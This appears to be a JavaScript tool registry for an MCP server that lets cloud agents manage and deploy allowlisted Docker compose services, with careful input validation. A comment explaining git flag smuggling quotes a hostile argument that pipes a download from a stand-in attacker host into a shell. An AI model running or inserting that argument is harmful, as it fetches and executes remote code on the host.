// Tool registry — scoped to **Docker / CI-CD only** per operator decision.
//
// What this exists for: cloud action runners (GitHub Actions, Claude.ai
// routines, etc.) building/pulling images that materialize into the local
// Docker compose stack at `templates/local-stack/`.
//
// Hard rules:
//   - Allowlisted compose service names ONLY (`ALLOWED_SERVICES` in config.mjs)
//   - No free-form shell. Every tool shells out to `docker` (or `docker
//     compose`) with whitelisted args
//   - `fleet.logs` refuses spoke processes — docker-only scope
//   - Single in-flight build per service (mutex) to avoid corrupting layer
//     cache or burning duplicate cycles
//   - Substring filtering (not regex) on caller-supplied input — kills ReDoS

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { ALLOWED_SERVICES } from "./config.mjs";
import {
  assertGitRepo, currentBranch, workingTreeStatus, fetchBranch,
  checkoutBranch, fastForward, currentSha, shortLog,
} from "./git-helpers.mjs";

const execFileP = promisify(execFile);
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const COMPOSE_FILE = path.join(ROOT, "templates", "local-stack", "docker-compose.yml");
// Hub repo is the one containing templates/local-stack/docker-compose.yml.
// fleet_deploy currently only operates against this repo (platform-tier
// services). Spoke-build support (backend-core / middle-core / frontend-core
// from their own repos) is deferred until the allowlist gets a richer shape.
const HUB_REPO_PATH = ROOT;

// docker compose call timeouts — protect against runaway invocations. Build is
// allowed longer; lifecycle ops should be quick.
const TIMEOUT_FAST_MS  = 60_000;        // ps, inspect, logs, up/down/restart
const TIMEOUT_BUILD_MS = 30 * 60_000;   // docker build can legitimately take a while

// --- mutex --------------------------------------------------------------------
// Per-service single-in-flight lock so two cloud agents can't kick the same
// build / restart concurrently and corrupt each other.
const inFlight = new Map();
async function withServiceLock(service, fn) {
  if (inFlight.has(service)) {
    return { error: "busy", message: `service '${service}' has another operation in flight` };
  }
  inFlight.set(service, Date.now());
  try { return await fn(); }
  finally { inFlight.delete(service); }
}

function assertDockerService(service) {
  if (!service) throw new Error("'service' is required");
  const svc = ALLOWED_SERVICES[service];
  if (!svc) throw new Error(`'${service}' not in allowlist (${Object.keys(ALLOWED_SERVICES).join(", ")})`);
  if (svc.tier !== "platform") {
    throw new Error(`'${service}' is not a docker-tier service (tier='${svc.tier}'). MCP is docker-only.`);
  }
  return svc;
}

// --- helpers ------------------------------------------------------------------
async function dockerCompose(args, timeoutMs = TIMEOUT_FAST_MS) {
  // `docker compose` (NOT `docker-compose`) is the modern plugin shape.
  return execFileP("docker", ["compose", "-f", COMPOSE_FILE, ...args], {
    cwd: ROOT,
    maxBuffer: 16 * 1024 * 1024,
    timeout: timeoutMs,
  });
}

// ---------- ps / inspect / logs (read-only) ----------------------------------

async function ps() {
  const out = [];
  for (const [name, svc] of Object.entries(ALLOWED_SERVICES)) {
    if (svc.tier !== "platform") continue;
    try {
      const { stdout } = await execFileP("docker", [
        "ps", "-a",
        "--filter", `name=^${svc.container}$`,
        "--format", "{{.Names}}\t{{.Status}}\t{{.Ports}}\t{{.Image}}",
      ], { timeout: TIMEOUT_FAST_MS });
      const line = stdout.trim().split("\n")[0];
      if (line) {
        const [n, status, ports, image] = line.split("\t");
        out.push({ name, container: n, status, ports, image });
      } else {
        out.push({ name, container: svc.container, status: "not present" });
      }
    } catch (e) {
      out.push({ name, container: svc.container, status: `docker error: ${e.message.slice(0,80)}` });
    }
  }
  return { services: out };
}

async function inspect({ service }) {
  const svc = assertDockerService(service);
  try {
    const { stdout } = await execFileP("docker", [
      "inspect", svc.container, "--format",
      '{{json .Config.Image}}|{{json .State.Status}}|{{json .NetworkSettings.Ports}}|{{json .Config.Env}}',
    ], { timeout: TIMEOUT_FAST_MS });
    const [imageJ, statusJ, portsJ, envJ] = stdout.trim().split("|");
    const env = JSON.parse(envJ) || [];
    // Strip env VALUES — only return key names; values frequently contain secrets.
    const env_keys = env.map((kv) => String(kv).split("=", 1)[0]).filter(Boolean);
    return {
      service,
      container: svc.container,
      image: JSON.parse(imageJ),
      status: JSON.parse(statusJ),
      ports: JSON.parse(portsJ),
      env_keys, // values intentionally omitted (potential secrets)
    };
  } catch (e) {
    throw new Error(`docker inspect failed for ${svc.container}: ${e.message.slice(0,200)}`);
  }
}

async function logs({ service, since = "5m", grep = null, level = null, limit = 100 } = {}) {
  const svc = assertDockerService(service);
  const { stdout } = await execFileP("docker", [
    "logs", "--since", since, "--tail", String(limit), svc.container,
  ], { maxBuffer: 4 * 1024 * 1024, timeout: TIMEOUT_FAST_MS });
  let lines = stdout.split("\n").filter(Boolean);
  // Substring matching only — caller input is never a regex (ReDoS surface).
  if (grep) {
    const needle = String(grep).slice(0, 200).toLowerCase();
    lines = lines.filter((l) => l.toLowerCase().includes(needle));
  }
  if (level) {
    const needle = String(level).slice(0, 32).toLowerCase();
    lines = lines.filter((l) => l.toLowerCase().includes(needle));
  }
  return { service, container: svc.container, lines: lines.slice(-limit) };
}

// ---------- build (mutating) -------------------------------------------------

async function build({ service, no_cache = false } = {}) {
  const svc = assertDockerService(service);
  return withServiceLock(service, async () => {
    const args = ["build"];
    if (no_cache) args.push("--no-cache");
    args.push(service); // compose service name
    try {
      const { stdout, stderr } = await dockerCompose(args, TIMEOUT_BUILD_MS);
      return {
        service,
        ok: true,
        // Tail both streams — full output is too large for an MCP response.
        stdout_tail: stdout.split("\n").slice(-40).join("\n"),
        stderr_tail: stderr.split("\n").slice(-40).join("\n"),
      };
    } catch (e) {
      return {
        service,
        ok: false,
        error: e.message.slice(0, 400),
        stdout_tail: (e.stdout || "").split("\n").slice(-40).join("\n"),
        stderr_tail: (e.stderr || "").split("\n").slice(-40).join("\n"),
      };
    }
  });
}

// ---------- up / down / restart (mutating) -----------------------------------

async function up({ service } = {}) {
  const svc = assertDockerService(service);
  return withServiceLock(service, async () => {
    try {
      const { stdout, stderr } = await dockerCompose(["up", "-d", "--no-build", service]);
      return { service, ok: true, stdout_tail: stdout.split("\n").slice(-20).join("\n"), stderr_tail: stderr.split("\n").slice(-20).join("\n") };
    } catch (e) {
      return { service, ok: false, error: e.message.slice(0, 400), stderr_tail: (e.stderr || "").split("\n").slice(-20).join("\n") };
    }
  });
}

async function down({ service } = {}) {
  const svc = assertDockerService(service);
  return withServiceLock(service, async () => {
    try {
      // `compose down <svc>` doesn't exist — use `compose stop` + `compose rm -f`.
      // Keeps volumes; ARC-ADR-023 platform tier is stateful — destroying
      // volumes is NOT a runtime cloud-agent operation.
      const stop = await dockerCompose(["stop", service]);
      const rm   = await dockerCompose(["rm", "-f", service]);
      return { service, ok: true, stopped: stop.stdout.trim(), removed: rm.stdout.trim() };
    } catch (e) {
      return { service, ok: false, error: e.message.slice(0, 400), stderr_tail: (e.stderr || "").split("\n").slice(-20).join("\n") };
    }
  });
}

async function restart({ service } = {}) {
  const svc = assertDockerService(service);
  return withServiceLock(service, async () => {
    try {
      const { stdout, stderr } = await dockerCompose(["restart", service]);
      return { service, ok: true, stdout_tail: stdout.split("\n").slice(-20).join("\n"), stderr_tail: stderr.split("\n").slice(-20).join("\n") };
    } catch (e) {
      return { service, ok: false, error: e.message.slice(0, 400), stderr_tail: (e.stderr || "").split("\n").slice(-20).join("\n") };
    }
  });
}

// ---------- deploy (the headline cloud-agent workflow) ----------------------
//
// fleet_deploy({ service, branch, no_cache, no_restart, remote })
//
// One-shot cloud-driven build: cloud agent says "deploy branch X of <service>
// on the operator's PC" → server fetches the branch, checks out, builds the
// image via docker compose, optionally restarts. Returns the full transcript
// so the cloud agent can see exactly what happened (including any test/build
// failures).
//
// Hard rules:
//   - Refuses if hub working tree is dirty (would clobber operator WIP).
//   - Refuses if the post-checkout pull would require a merge (--ff-only).
//   - Service must be in the platform allowlist.
//   - Single in-flight per service (mutex).
//   - Logs git ref + sha + tail of recent commits so audit captures the
//     deployed code identity.

// Strict allowlist for git-CLI inputs. Why this matters:
//   `git fetch origin --upload-pack='curl evil.com|sh'` is a documented
//   git RCE primitive (the value of --upload-pack is run as the SSH upload-
//   pack helper). Any string passed to git that starts with `-` is
//   interpreted as a flag, NOT a positional arg — so shell-metacharacter
//   filtering alone (";", "&", "`" etc.) does NOT defend against argv
//   flag smuggling.
//
// Branch validation follows git's own refname format
// (https://git-scm.com/docs/git-check-ref-format) — preempting refnames
// git would later reject means a cleaner error to the caller AND no chance
// of subtle command-interpretation surprises.
//
// Refs:
//   - https://git-scm.com/docs/git-check-ref-format
//   - https://lore.kernel.org/git/ (search "upload-pack injection")
function isValidBranch(s) {
  if (typeof s !== "string") return false;
  if (s.length === 0 || s.length > 200) return false;
  // First char alphanumeric or underscore → no leading "-" (argv flag), no
  // leading "." or "/" (git refname rules + path-traversal defense).
  if (!/^[A-Za-z0-9_]/.test(s)) return false;
  // Body: only the conservative refname charset.
  if (!/^[A-Za-z0-9._/-]+$/.test(s)) return false;
  // Git refname rules:
  if (s.includes("..")) return false;        // path traversal + git rule
  if (s.includes("//")) return false;        // git rule
  if (s.endsWith(".") || s.endsWith("/") || s.endsWith(".lock")) return false;
  return true;
}
function isValidRemote(s) {
  if (typeof s !== "string") return false;
  if (s.length === 0 || s.length > 50) return false;
  // Remotes are aliases like `origin` or `upstream` — no slashes, no dots.
  return /^[A-Za-z0-9][A-Za-z0-9_-]*$/.test(s);
}

async function deploy({ service, branch, no_cache = false, no_restart = false, remote = "origin" } = {}) {
  assertDockerService(service);
  if (!branch || typeof branch !== "string") {
    throw new Error("'branch' is required");
  }
  if (!isValidBranch(branch)) {
    // Specifically caught: leading "-" (flag smuggling), leading "." or "/"
    // (path traversal), whitespace, shell metacharacters, "..", "//",
    // trailing "." / "/" / ".lock", any non-printable byte. Single error
    // message — don't leak the exact failure to a malicious caller.
    throw new Error("branch name fails refname format");
  }
  if (!isValidRemote(remote)) {
    throw new Error("remote name fails format");
  }
  assertGitRepo(HUB_REPO_PATH);

  return withServiceLock(service, async () => {
    const transcript = [];
    const out = { service, branch, ok: false, steps: transcript };

    try {
      // Step 1: refuse to proceed if hub working tree is dirty.
      const status = await workingTreeStatus(HUB_REPO_PATH);
      transcript.push({ step: "status", clean: status.clean, dirty_count: status.dirty_count });
      if (!status.clean) {
        out.error = `hub repo at ${HUB_REPO_PATH} has ${status.dirty_count} uncommitted change(s); refusing to checkout '${branch}' (would clobber operator WIP). Resolve locally first.`;
        out.dirty_sample = status.dirty_files;
        return out;
      }

      // Step 2: snapshot starting state.
      const startBranch = await currentBranch(HUB_REPO_PATH);
      const startSha = await currentSha(HUB_REPO_PATH);
      transcript.push({ step: "start_state", branch: startBranch, sha: startSha });

      // Step 3: fetch the requested branch.
      const fetched = await fetchBranch(HUB_REPO_PATH, remote, branch);
      transcript.push({ step: "fetch", remote, branch, stderr_tail: (fetched.stderr || "").split("\n").slice(-5).join("\n") });

      // Step 4: checkout.
      const checkedOut = await checkoutBranch(HUB_REPO_PATH, branch);
      transcript.push({ step: "checkout", branch, stderr_tail: (checkedOut.stderr || "").split("\n").slice(-5).join("\n") });

      // Step 5: fast-forward to the latest of <remote>/<branch>.
      const ff = await fastForward(HUB_REPO_PATH, remote, branch);
      transcript.push({ step: "fast_forward", stdout_tail: (ff.stdout || "").split("\n").slice(-5).join("\n") });

      const headSha = await currentSha(HUB_REPO_PATH);
      const recent = await shortLog(HUB_REPO_PATH, 5);
      transcript.push({ step: "head_state", sha: headSha, recent });

      // Step 6: build.
      const buildArgs = ["build"];
      if (no_cache) buildArgs.push("--no-cache");
      buildArgs.push(service);
      try {
        const { stdout, stderr } = await dockerCompose(buildArgs, TIMEOUT_BUILD_MS);
        transcript.push({
          step: "build", ok: true,
          stdout_tail: stdout.split("\n").slice(-30).join("\n"),
          stderr_tail: stderr.split("\n").slice(-30).join("\n"),
        });
      } catch (e) {
        transcript.push({
          step: "build", ok: false,
          error: e.message.slice(0, 400),
          stdout_tail: (e.stdout || "").split("\n").slice(-30).join("\n"),
          stderr_tail: (e.stderr || "").split("\n").slice(-30).join("\n"),
        });
        out.error = `build failed for ${service} on ${branch}@${headSha.slice(0, 7)}`;
        return out;
      }

      // Step 7: restart (unless asked not to).
      if (!no_restart) {
        try {
          const { stdout, stderr } = await dockerCompose(["restart", service]);
          transcript.push({
            step: "restart", ok: true,
            stdout_tail: stdout.split("\n").slice(-10).join("\n"),
            stderr_tail: stderr.split("\n").slice(-10).join("\n"),
          });
        } catch (e) {
          transcript.push({
            step: "restart", ok: false,
            error: e.message.slice(0, 400),
            stderr_tail: (e.stderr || "").split("\n").slice(-10).join("\n"),
          });
          // Don't fail the whole deploy — the build succeeded; restart failure
          // is operator-visible and recoverable.
          out.warning = `build OK but restart failed for ${service}; operator should investigate`;
        }
      }

      out.ok = true;
      out.deployed_sha = headSha;
      out.deployed_branch = branch;
      return out;
    } catch (e) {
      out.error = e.message.slice(0, 400);
      transcript.push({ step: "fatal", error: out.error });
      return out;
    }
  });
}

// ---------- registry ---------------------------------------------------------
//
// Tools are functionally UNIVERSAL: they speak docker, which is the same
// surface whether docker is local, on a runner box in the office, or on a
// VM in dev-cloud. The "where this server is deployed" label lives ONCE on
// the server instance (see INSTANCE_TARGET in config.mjs) and is advertised
// to clients via tools/list `_meta.target`. Don't put per-tool target hardcodes
// here unless a tool genuinely shouldn't be exposed against some targets —
// in which case set its optional `availableOn: ["local-home", ...]` array
// and the server filters it out for other instances.

export const TOOLS = [
  {
    name: "fleet_ps",
    description: "List allowlisted docker platform services with their current state (image, status, ports).",
    inputSchema: { type: "object", properties: {} },
    risk: "low", handler: ps,
  },
  {
    name: "fleet_inspect",
    description: "Inspect one docker platform service: image, status, ports, env KEY names (values redacted).",
    inputSchema: { type: "object", required: ["service"], properties: { service: { type: "string", description: "Allowlisted service name" } } },
    risk: "low", handler: inspect,
  },
  {
    name: "fleet_logs",
    description: "Tail logs of a docker platform service via `docker logs`. since='5m'/'1h'/'1d', grep is substring (not regex), level is substring (e.g. 'ERROR'), limit caps output lines.",
    inputSchema: {
      type: "object", required: ["service"],
      properties: {
        service: { type: "string" },
        since:   { type: "string", default: "5m" },
        grep:    { type: "string" },
        level:   { type: "string" },
        limit:   { type: "integer", default: 100 },
      },
    },
    risk: "low", handler: logs,
  },

  // --- lifecycle (real) ---
  {
    name: "fleet_up",
    description: "Bring up (start) an allowlisted docker compose service if not running. Idempotent. Does not rebuild images.",
    inputSchema: { type: "object", required: ["service"], properties: { service: { type: "string" } } },
    risk: "med", handler: up,
  },
  {
    name: "fleet_down",
    description: "Stop and remove the container for an allowlisted service (keeps volumes — platform tier is stateful).",
    inputSchema: { type: "object", required: ["service"], properties: { service: { type: "string" } } },
    risk: "med", handler: down,
  },
  {
    name: "fleet_restart",
    description: "Restart an allowlisted docker compose service in place.",
    inputSchema: { type: "object", required: ["service"], properties: { service: { type: "string" } } },
    risk: "med", handler: restart,
  },

  // --- build (real) ---
  {
    name: "fleet_build",
    description: "Build the docker image for an allowlisted compose service from local source. Single in-flight build per service. no_cache=true to bust layer cache.",
    inputSchema: {
      type: "object", required: ["service"],
      properties: {
        service:  { type: "string" },
        no_cache: { type: "boolean", default: false },
      },
    },
    risk: "high", handler: build,
  },

  // --- deploy (the headline cloud-agent workflow) ---
  // Headline cloud-agent tool: 'build branch X of <service> on operator's PC'
  // in one call. Fetches branch, refuses if working tree is dirty, checks
  // out, fast-forwards, builds, optionally restarts. Full step transcript
  // returned so failures are debuggable from the cloud side.
  //
  // Risk: highest of all tools. CHECKS OUT ANY BRANCH the caller names —
  // if a malicious actor pushes a branch with a poisoned Dockerfile, this
  // tool will build it. Mitigations: (a) email-allowlist on the JWT auth
  // path, (b) per-tool approval in claude.ai's UI (DO NOT auto-approve),
  // (c) refusing on dirty working tree prevents loss of operator WIP, (d)
  // fast-forward-only pull prevents subtle merge-then-build behavior.
  {
    name: "fleet_deploy",
    description: "Cloud-agent build-and-run flow: fetch a git branch on the operator's hub repo, check it out, build the docker image for an allowlisted compose service, optionally restart the container. Refuses if the hub working tree has uncommitted changes (to protect operator WIP). Returns a full step transcript including the deployed commit SHA. HIGH RISK — keep claude.ai per-tool approval ON; never auto-approve.",
    inputSchema: {
      type: "object", required: ["service", "branch"],
      properties: {
        service:    { type: "string", description: "Allowlisted compose service name" },
        branch:     { type: "string", description: "Git branch to deploy (in the hub repo)" },
        remote:     { type: "string", description: "Git remote name (default: origin)", default: "origin" },
        no_cache:   { type: "boolean", description: "Pass --no-cache to docker compose build", default: false },
        no_restart: { type: "boolean", description: "Skip the post-build restart step", default: false },
      },
    },
    risk: "high", handler: deploy,
  },
];
